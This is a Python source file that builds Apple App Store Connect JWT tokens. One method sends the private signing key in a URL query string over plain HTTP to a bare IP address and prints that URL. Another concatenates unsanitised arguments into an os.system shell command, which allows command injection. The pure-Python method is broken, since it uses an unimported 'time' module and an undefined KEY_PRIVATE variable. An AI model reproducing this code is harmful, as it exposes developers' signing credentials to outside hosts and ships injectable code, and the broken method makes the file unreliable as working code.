# 导入selenium的浏览器驱动接口
import sys
import os
import json
import requests
import platform 
if 'Darwin' not in platform.system():
    import jwt

o_path = os.getcwd()  # 返回当前工作目录
sys.path.append(o_path)  # 添加自己指定的搜索路径 
sys.path.append('../../') 
sys.path.append('./') 
 

from Project.Resource import mainResource
from Common import Source 
from Common.File.FileUtil import FileUtil 
from AppInfo.AppInfo import mainAppInfo
    

class JwtToken:
 

    def GetUrl(self, url): 
        r = requests.get(url)
        return r.content.decode('utf-8',"ignore")

    def GetToken(self, key_id, user_id,key_private): 
        return self.GetTokenByWeb(key_id,user_id,key_private) 
     
    def GetTokenByWeb(self, key_id, user_id,key_private): 
        url = "http://47.242.56.146:5000/AppleJWTToken?keyid="+key_id+"&userid="+user_id+"&KEY_PRIVATE="+key_private
        print("url=",url)
        result = self.GetUrl(url)
        # print("result=",result)
        return result 
 
    def GetTokenByGo(self, keyid, userid,key_private): 
        godir = mainResource.GetDirGoRoot()+ "/Jwt" 
        os.chdir(godir)
        filego = "Main.go" 
        cmd = "go run "+filego+" "+keyid+" "+userid+" "+key_private
        print(cmd)
        os.system(cmd)

        fileResult= "Token.txt"
        return FileUtil.GetFileString(godir+"/"+fileResult)


    def GetTokenByPython(self, keyid, userid,key_private): 
 
        # 构造header

        # headers = {
        # 'typ': 'jwt',
        # 'alg': 'HS256'
        # }

        headers = {
            "alg": "ES256",
            # "kid": "MVG9NGFVX7",
            "kid": keyid,
            "typ": "JWT"
        }

        # 构造payload
        # payload = {
        # 'user_id': 1, # 自定义用户ID
        # 'username': 'pig',
        # 'exp': datetime.datetime.utcnow() + datetime.timedelta(days=5)
        # }

        now_timestamp = int(time.time())+60*10
        # print(str(now_timestamp))

        payload = {
            # "iss": "69a6de89-f844-47e3-e053-5b8c7c11a4d1",
            "iss": userid,
            # 1528408800

            "exp": now_timestamp,
            "aud": "appstoreconnect-v1"
        }
        # print(payload)
        
        # print(KEY_PRIVATE)
        result = "result"
        result = jwt.encode(payload=payload, key=KEY_PRIVATE,
                            algorithm='ES256', headers=headers).decode('utf8')
        # print("CreateJWTToken =",result)
        return result

mainJwtToken = JwtToken()